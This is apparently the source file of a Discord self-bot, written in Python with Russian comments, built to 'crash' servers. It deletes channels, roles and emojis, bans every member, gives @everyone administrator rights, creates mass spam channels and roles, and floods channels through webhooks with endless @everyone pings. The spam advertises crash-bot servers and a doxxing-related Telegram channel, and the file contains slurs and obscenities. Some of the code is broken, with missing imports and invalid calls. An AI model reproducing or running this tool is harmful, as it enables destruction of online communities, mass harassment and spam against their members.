import keep_alive
import asyncio
import discord
from discord.ext import commands
import typing
from asyncio import create_task
import time
import contextlib, textwrap
from contextlib import redirect_stdout
import dhooks
import requests as rq
import inspect
import traceback
import io
import threading
from random import randint
import numpy
import colorama
import base64
import codecs
import datetime
import random
import datetime
from pypresence import Presence
import smtplib
import string
import ctypes
import urllib.parse
import urllib.request
import re
import json
import requests
import requests as rq
import webbrowser
import inspect
import requests
from asyncio import sleep
from discord.ext import commands
import discord
import asyncio
import functools
import logging
import textwrap
import os
import random
from discord import Permissions








client = commands.Bot(command_prefix=">", intents=discord.Intents.all(), self_bot=True)
# создаем переменную бота
client.remove_command('help')


@client.event
async def on_ready():
  await client.change_presence(activity=discord.Streaming(name="краш-боты в био", url='https://twitch.tv/jktimosha'))
Topic = "https://discord.gg/eJC5G2jrhD"
rolesName = "hackbypug"
rolesColor = random
rolesResetPermissions = False
lmPurge = False
channelsTopic = "https://discord.gg/eJC5G2jrhD"



bloodspam = 'https://discord.gg/eJC5G2jrhD - лучший сервер с краш ботами|| @everyone @here ||)'

async def act5(ctx):
    for _ in range(50):
        chhhhh = await ctx.guild.create_text_channel(f"crash-by-austr-{random.randint(1, 1000)}")




async def killchannel(ctx,ch):
    try:
        await ch.delete()
    except:
        pass



async def killrole(ctx,role):
    try:
        await role.delete()
    except:
        pass

async def createchannel(ctx):
    try:
        c = await ctx.guild.create_text_channel(f'crash-by-jk-{random.randint(1, 1000)}')
    except:
        pass
    else:
        pass
      
async def createrole(ctx):
    try:
        await ctx.guild.create_role(name=f'Crash by jk {random.randint(1, 1000)}',color = 0xff0000)
    except:
        pass

@client.command()
async def fastcrash(ctx):
    for rolee in ctx.guild.roles:
        create_task(killrole(ctx,role=rolee))
    for channel in ctx.guild.channels:
        create_task(killchannel(ctx,ch=channel))
    for _ in range(50):
        create_task(createchannel(ctx))
        create_task(createrole(ctx))


async def sendch(ctx,ch,text,count):
 for _ in range(count):
    try:
        await ch.send(text)
    except:
        pass

@client.command()
async def chanspam(ctx):
    for channel in ctx.guild.text_channels:
        create_task(sendch(ctx,ch=channel,text='@everyone @here https://discord.gg/eJC5G2jrhD',count=1))

@client.command()
async def hookall2(ctx):
    member=ctx.author
    whlist=[]
    for channel in ctx.guild.text_channels:
        if member.permissions_in(channel).manage_webhooks:
            webhoks = await channel.webhooks()
            if len(webhoks) > 0:
                for webhook in webhoks:
                    whlist.append(webhook)
            else:
                webhook = await channel.create_webhook(name="Austr Crash")
                whlist.append(webhook)
        else:
            print(f"[{client.user}] "+f"{channel.name} ------------- Нет")
    while True:
        for webhook in whlist:
            try: await webhook.send('''
https://discord.gg/eJC5G2jrhD Краш-боты тут
|| @everyone @here ||
''', username = "Austr Crash")
            except: pass

@client.command()
async def help(ctx):
  await ctx.message.delete()
  await ctx.send("""
```diff
- >copyserver - скопировать сервер
- >clonechannel - резетнуть канал
- >eval - выполнение кода
- >ping - показывает пинг селфача
- >crash - автокраш сервер
- >fastcrash - тоже быстрый краш сервера
- >lavan - краш сервера с обходом лавана
- >chls - удаление и создание каналов
- >rls - удаление и создание ролей
- >dlc - удаление каналов
- >dlr - удаление ролей
- >rnc - переименование каналов
- >rnr - переименование ролей
- >spamchannels - спам рандом каналами
- >spamroles - спам рандом ролями
- >banall - забанить всех не через реквесты
- >ban_all - забанить всех через реквесты
- >spamemojis - спам эмодзями
- >channels - создание каналов с определенным именем и количеством
- >randomchannels - быстрое создание каналов с рандомом
- >delchannels - обычное удаление каналов
- >delroles - обычное удаление ролей
- >delvoice - удалить все войсы
- >delcategories - удалить все категории
- >deltext - удалить все текстовые каналы
- >everyone_admin - дать админку всем
- >reactionall - ставит реакции на последние [int] сообщений
- >antilavan - антилаван краш
- >chanspam - спам во все каналы
- >spamchan - спам в канал
- >stopspm - остановить спам
- >nuke - удаление всего
- >auto - автокраш сервера по обычному
- >rename - изменить имя сервера
- >hookall2 - новый спам вебхуками в каналы (медл)
- >webhooksspam - версия спама вебхуками 3
- >webhook - отправить сообщение от имени вебхука
- >webhookcreate - масс создание вебхуков
- >hookall - спам во все каналы вебхуком 
- >guild - создать сервер
- >status - установить статус
- >invite - информация о ссылке
```
  """)

@client.command()
async def spamchan(ctx, *, text=None):
	if text == None:
		await ctx.send("введи текст дауненок")
	else:
		global spam
		spam = True
		while spam:
			await ctx.send(text)


@client.command()
async def stopspm(ctx):
	global spam
	spam = False
	await ctx.message.add_reaction('✅')

@client.command()
async def spamv2(ctx, num=10, *, text='@everyone @here https://t.me/russian_deanon'):
	if num == 0 or text in ['']:
		await ctx.send(f'долбик скок спамить и текст')
	else:
		for spam in range(int(num)):
			await ctx.send(f'{text}')



async def sendhook(ctx, channelm):
		for i in range(100):
			hooks = await channelm.webhooks()
			for hook in hooks:
				await hook.send('https://discord.gg/eJC5G2jrhD Краш-боты тут')

@client.command()
async def spamallchannels(ctx):
	await ctx.message.delete()
	for i in range(6):
		text = f'{randint(0,999)} Ваш сервер был выебан.https://discord.gg/eJC5G2jrhD  @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||'
		await ctx.send(text)
	for c in ctx.guild.text_channels:
		try:
			await c.create_webhook(name='Hac')
		except Exception as e:
			print(e)

	try:
			for c in ctx.guild.text_channels:
				asyncio.create_task(sendhook(ctx, channelm=c))
				hooks = await c.webhooks()
				for hook in hooks:
					await hook.send(f'{randint(0,999)} | Ваш сервер был выебан. https://discord.gg/eJC5G2jrhD @everyone @here')
	except Exception as e:
			print(e)

	for c in ctx.guild.text_channels:
		try:
			await c.send(f'{randint(0,999)} Ваш сервер был выебан. https://discord.gg/eJC5G2jrhD @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||')
		except:
			pass




@client.command()
async def webhookcreate(ctx, *, name):
	try: await ctx.message.delete()
	except: pass
	for channel in ctx.guild.text_channels:
		try:
			await channel.create_webhook(name=name, reason="Self bot")
			print(Fore.WHITE + f"[LOG] дал на рот {channel.name}")
		except: pass
	print(Fore.WHITE + "[LOG] Успешно дал на рот!")
	await ctx.send("**:white_check_mark: Успешно дал на рот!**", delete_after=5)

async def hook(webhook, message):
	while(15):
		try: await webhook.send(message)
		except: break

@client.command()
async def webhooksspam(ctx, *, message):
	try: await ctx.message.delete()
	except: pass
	for channel in ctx.guild.text_channels:
		webhooks_channel = await channel.webhooks()
		for webhook in webhooks_channel:
			for i in range(5):
				asyncio.create_task(hook(webhook, message))



@client.command()
async def spamchannels(ctx):
	try: await ctx.message.delete()
	except: pass
#		try:
	name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
	await ctx.guild.create_category(name=name, reason="jk")
#		except: pass
	while(30):
		try:
			name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
			await ctx.guild.create_category(name=name, reason="jk")
		except: break
		try:
				name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
				await ctx.guild.create_text_channel(name=name, category=random.choice(ctx.guild.categories), topic="https://discord.gg/eJC5G2jrhD", reason="jk")
		except: break
		try:
			name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
			await ctx.guild.create_voice_channel(name=name, category=random.choice(ctx.guild.categories), reason="jk")
		except: break

@client.command()
async def spamroles(ctx):
	try: await ctx.message.delete()
	except: pass
	while True:
		try:
			name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
			await ctx.guild.create_role(name=name, colour=discord.Colour(0xFF0000), permissions=discord.all())
		except: break


@client.command()
async def reactionall( ctx, amount: int):
	await ctx.message.delete()
	messages = await ctx.channel.history(limit=amount).flatten()
	reactioned=0
	for message in messages:
		await message.add_reaction("🐷")
		await message.add_reaction("🐽")
		reactioned+=1
	await ctx.send(f"**:white_check_mark: Успешно поставил реакциии на {reactioned} сообщений!**", delete_after=5)



@client.command(pass_context=True)
async def everyone_admin(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)
    await ctx.message.delete()

@client.command()
async def delspamchannels(ctx,channame):
    count = 0
    for channel in ctx.guild.channels:
      if channel.name == channame:
        try:
            await channel.delete()
            count += 1
        except:
            try: 
                await channel.delete()
                count += 1
            except: pass
        else: pass
    mes = await ctx.send(f"✅ Удалено {count} каналов")
    await mes.add_reaction("✅")


@client.command()
async def spamemojis(ctx):
	if ctx.message.attachments==[]:
		await ctx.message.edit(content=f"**:warning: Для использования данной команды отправьте фото!**", delete_after=3)
		return
	await ctx.message.delete()
	with open('Temp/emoji_icon.png', 'wb+') as file:
		file.write(requests.get(ctx.message.attachments[0].url).content)
	with open("Temp/emoji_icon.png", "rb") as file:
		img=file.read()
		for i in range(49):
			name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
			await ctx.guild.create_custom_emoji(name = (name), image = img)


@client.command()
async def invite(ctx, *, link):
		if "discord.gg/" in link:
			link2 = (link.split("https://discord.gg/")[1])[:10]
			response = requests.get(f'https://discord.com/api/v6/invite/{link2}').json()
			if 'Unknown Invite' in response:
				await ctx.message.edit(content="**:warning: Неправильная ссылка приглашения!**", delete_after=3)
			else:
				try: embed=f"**Имя Сервера: `{response['guild']['name']}`\nid Сервера: `{response['guild']['id']}`\nИмя Создателя приглашения: `{response['inviter']['username']}`\nТег Создателя приглашения: `{response['inviter']['discriminator']}`\nid Создателя приглашения: `{response['inviter']['id']}`\nИмя Канала: `{response['channel']['name']}`\nid Канала: `{response['channel']['id']}`**"
				except:
					await ctx.message.edit(content="**:warning: Неправильная ссылка приглашения!**", delete_after=3)
					return
				
				await ctx.message.edit(content=embed)
		else:
			await ctx.message.edit(content="**:warning: Укажите пожалуйста ссылку приглашения в формате\n<https://discord.gg/код_ссылки_приглашения>**", delete_after=5)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    for members in ctx.guild.members:
        try:
            await members.ban()
        except:
            pass


@client.command()
async def guild(ctx, *, name='test'):
	newguild = await client.create_guild(name=name)
	channellist = await newguild.fetch_channels()
	for c in channellist:
		await c.delete()
	await newguild.create_text_channel('тест ботов')



@client.command()
async def status(ctx, arg='', *, names=''):
    bll = [''] 
    if arg == 'stream' and names not in bll:
        await client.change_presence(activity=discord.Streaming(name=names, description = "discord.gg/lavanbot", state="негры", url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watch' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names, description="иди нахуй", state="discord.gg/lavanbot"))
        await ctx.message.add_reaction('✅')
    elif arg == 'listen' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names, description="иди нахуй", state="discord.gg/lavanbot"))
        await ctx.message.add_reaction('✅')
    elif arg == 'play' and names not in bll:
        await client.change_presence(activity=discord.Game(name=names, description="иди нахуй", state="discord.gg/lavanbot"))
        await ctx.message.add_reaction('✅')


@client.command()
async def auto(ctx):
  await ctx.message.delete()
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
    guild = ctx.message.guild
    await guild.edit(name='Crashed By jk')
  for y in ctx.guild.roles:
    try: await y.delete()
    except: pass
  for z in list(ctx.guild.emojis):
    try: await z.delete()
    except: pass
  for _ in range(50):
    await ctx.guild.create_text_channel(name=f"crash-by-jk-{random.randint(1, 1000)}")
  for _ in range(50):
    await ctx.guild.create_role(name =f"crash-by-jk-{random.randint(1, 1000)}", color = 0xff0000)



@client.command()
async def antilavan(ctx):
    for role in ctx.guild.roles:
        try:
            await role.edit(name="Suck dick", permissions=discord.Permissions(permissions=0))
        except:
            pass
        else:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=f"crash-byjk-{random.randint(1, 1000)}", topic="crashed | https://discord.gg/eJC5G2jrhD")
        except:
            pass
        else:
            pass

    for chan in ctx.guild.text_channels:
        try:
            hell = await chan.create_webhook(name='Crashed by jk')
        except:
            pass

    for i in range(30):
        for channels in ctx.guild.text_channels:
            hooks = await channels.webhooks()
            for hook in hooks:
                await hook.send('@everyone @here Данный сервер крашится https://discord.gg/eJC5G2jrhD')

#код матвея до сих пор робит
@client.command()
async def copyserver(ctx, id=None):
    await ctx.message.delete()
    if not id and ctx.guild: id = ctx.guild.id
    guild=client.get_guild(int(id))
    if not guild: return await ctx.message.edit(content="Invalid id")
    icon_hash = guild.icon
    with open('clone_icon.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
    new_guild = await client.create_guild(name=guild.name, icon=open('clone_icon.png', 'rb').read())
    for dc in new_guild.channels:
        await dc.delete()
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
            else:
                await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)
    for emoji in guild.emojis:
        try:
            url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
            await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
        except:
            pass
    os.remove('clone_icon.png')






@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for m in ctx.guild.members():
    try: await m.ban()
    except: pass


@client.command()
async def delcategories(ctx):
  for c in ctx.guild.categories:
    try:
      await c.delete()
    except:
      try:
        await c.delete()
      except: 
        pass
      else:
        pass
    else:
      pass



@client.command()
async def delvoice(ctx):
  for c in ctx.guild.voice_channels:
    try:
      await c.delete()
    except:
      try:
        await c.delete()
      except: 
        pass
      else:
        pass
    else:
      pass


@client.command()
async def deltext(ctx):
  for c in ctx.guild.text_channels:
    try:
      await c.delete()
    except:
      try:
        await c.delete()
      except: 
        pass
      else:
        pass
    else:
      pass

@client.command()
async def crash(ctx):
    await ctx.message.delete()
    start = time.time()
    async def delc_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
    async def delr_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.delete()
            except:
                try:
                    await role.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
    async def crr_task(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, color):
            try:
                await guild.create_role(name=name, color=color)
            except:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)()) for _ in range(498)])
    async def crc_task(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=f"crash-by-austr-{random.randint(1, 1000)}", topic=topic)
            except Exception as e:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=f"crash-by-austr-{random.randint(1, 1000)}", topic=channelsTopic) for _ in range(50)])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task, delr_task, crr_task, crc_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 


@client.command()
async def lavan(ctx):
    async def spam_task(channel):
        me = asyncio.current_task()
        name = me.get_name()
        if lmPurge:
            try:
                await channel.purge(limit=10)
            except:
                pass
        for _ in range(spamCount):
            try:
                await channel.send(spamText)
            except:
                pass
            else:
                pass #print(f'[{F.BLUE}{name}{cl}] Отправил спам-сообщение')
    async def delc_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.edit(name=channelsName, topic=channelsTopic)
            except:
                try:
                    await channel.edit(name=channelsName, topic=channelsTopic)
                except:
                    pass
                else:
                    asyncio.create_task(spam_task(channel))
            else:
                asyncio.create_task(spam_task(channel))
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
    async def delr_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
            except:
                try:
                    await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
                except:
                    pass
                else:
                    pass 
            else:
                pass
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task, delr_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 

@client.command()
async def rnc(ctx):
    await ctx.message.delete()
    async def delc_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.edit(name=f"crash-by-austr-{random.randint(1, 1000)}", topic=channelsTopic)
            except:
                try:
                    await channel.edit(name=f"crash-by-austr-{random.randint(1, 1000)}", topic=channelsTopic)
                except:
                    pass
                else:
                    pass
            else:
                pass
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 



@client.command()
async def rnr(ctx):
    await ctx.message.delete()
    async def delr_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
            except:
                try:
                    await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
                except:
                    pass
                else:
                    pass 
            else:
                pass
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delr_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 





@client.command()
async def rls(ctx):
    await ctx.message.delete()
    async def delr_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.delete()
            except:
                try:
                    await role.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
    async def crr_task(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, color):
            try:
                await guild.create_role(name=name, color=color)
            except:
                pass
            else:
                pass
        await asyncio.gather(*[create(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)()) for _ in range(498)])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delr_task, crr_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass





@client.command()
async def chls(ctx):
    await ctx.message.delete()
    async def delc_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
    async def crc_task(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=name, topic=topic)
            except Exception as e:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=channelsName, topic=channelsTopic) for _ in range(498)])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task, crc_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 



@client.command()
async def randomchannels(ctx):
    await ctx.message.delete()
    async def crc_task(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=name, topic=topic)
            except Exception as e:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=f"crash-by-austr-{random.randint(1, 1000)}", topic=channelsTopic) for _ in range(50)])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [crc_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)
    pass 




@client.command()
async def dlc(ctx):
    await ctx.message.delete()
    async def delc_task(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else: 
                pass 
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
    tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task]]
    while False in [t.done() for t in tasks]:
        await asyncio.sleep(0.1)

    pass



@client.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        if channel.name == 'crash-by-austr' or channel.name == 'crashed-by-autst-great':
            webhook = await channel.create_webhook(name = "Austr")
            webhook_url = webhook.url
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))

                while True:
                    try:
                        await webhook.send('''Сервер выебан,смиритесь и переходите на наш))  В нашей телеге тебя научат разоблачению личности мошенников
https://discord.gg/lavanbot / https://t.me/russian_deanon / вк создателя https://vk.com/antimapper
                        || @everyone @here ||
''')
                    except:
                        return

@client.command()
async def clonechannel(ctx):
    await ctx.message.delete()
    new=await ctx.channel.clone()
    await new.edit(position=ctx.channel.position)
    await ctx.channel.delete()

@client.command()
async def webhook(ctx, *, text):
 await ctx.message.delete()
 ava=rq.get("https://media.discordapp.net/attachments/935489944057692201/937231771718811728/glitch_2022-1-12_18-34-22.jpg",headers={"user-agent": "Mozila"})
 webh=await ctx.channel.create_webhook(name='Austr', avatar=ava.content)
 await webh.send(text)



@client.command(description='crash|Краш-команды|Спамить вебхуками во все каналы сервера')
async def hookall(ctx, numb: typing.Optional[int] = 30, *, text='''Хочешь научиться такому же? Переходи к нам! А в нашем телеграмме вы найдете способы раскрытия личности мошенников!. https://discord.gg/lavanbot / https://t.me/russian_deanon / вк создателя https://vk.com/antimapper
|| @everyone @here ||
'''):
    async def spamtsk(channel):
        try:
            webh = await createhook(channel)
            await sendhook(webh, text, numb)
        except:
            return
    for channel in ctx.guild.text_channels:
        asyncio.create_task(spamtsk(channel))

async def createhook(channel):
    hooks = await channel.webhooks()
    if len(hooks) == 0:
        webh = await channel.create_webhook(name='Crash by Austr')
        return webh
    else:
        hooks = [webh for webh in hooks if webh.token]
        if len(hooks) == 0:
            webh = await channel.create_webhook(name='Crash by Austr')
            return webh
        else:
            return hooks[0]

async def sendhook(webh, text, nmb=30):
    for _ in range(nmb):
        try:
            await webh.send(text)
        except:
            break



async def ename(ctx, guild):
    with open('austr.jpg', 'rb') as f:
        icon = f.read()
    try:
        await ctx.guild.edit(name = "Crash by Austr", icon = icon)
    except:
        pass

@client.command()
async def rename(ctx, *, name = "Crash by Austr"):
    await ctx.message.delete()
    with open('austr.jpg', 'rb') as f:
        icon = f.read()
    try:
        await ctx.guild.edit(name = name, icon = icon)
    except:
        pass


@client.command()
async def ping(ctx):
    ping = client.latency
    await ctx.message.edit(content = f"`{ping * 1000:.0f}ms`")

@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(
            lambda m: m): #удаление определенного количества сообщений в чате
        try:
            await message.delete()
        except:
            pass


@client.command()
async def leave(ctx):
    await ctx.send('Гг я ливаю')
    await ctx.guild.leave()

           
@client.command()
async def channels(ctx, name, numb: typing.Optional[int] = 30):
  for _ in range(numb):
    try:
      await ctx.guild.create_text_channel(name=name, topic="discord.gg/lavanbot")
    except: pass


@client.command()
async def delchannels(ctx):
    await ctx.message.edit(content = "Удаляю")
    await ctx.message.add_reaction('🕐') 
    for channel in ctx.guild.channels:
        if channel is ctx.channel:
            pass
        else:
            try:
                await channel.delete()
            except:
                print(f"not deleted {channel}")
    await ctx.message.edit(content = "✅ **Готово**")
    await ctx.message.clear_reactions()
    await ctx.message.add_reaction("✅")


@client.command()
async def delroles(ctx):
    await ctx.message.edit(content = "Удаляю...")
    await ctx.message.add_reaction('🕐') 
    for role in ctx.guild.roles: #delete all roles
        try:
            await role.delete()
        except:
            print(f"[{client.user}] "+f"not deleted {role}")
    await ctx.message.edit(content = "✅ **Готово**")
    await ctx.message.clear_reactions()
    await ctx.message.add_reaction("✅")


TOKEN = os.getenv("TOKEN")   





@client.command()
async def ban_all(ctx, gid: int = None, chid: int = None):
    if not gid or not chid:
        gid=ctx.guild.id
        chid=ctx.channel.id
    with open('info.py', 'w') as f:
        f.write(f"gid={gid}\nchid={chid}")
    os.system('python3 runner.py')
    with open("ids.txt","r") as f:
        mems=f.read().split('\n')
    for id in mems:
        cod="""rq.put(f'https://discord.com/api/v9/guilds/{gid}/bans/{id}', headers={'Authorization': TOKEN})"""
        threading.Thread(target=exec, args=(cod,{'rq': rq, 'gid': gid, 'id': id, 'token': TOKEN},)).start()





keep_alive.keep_alive()
TOKEN = os.environ.get("TOKEN")
client.run(os.environ['TOKEN'], bot=False)
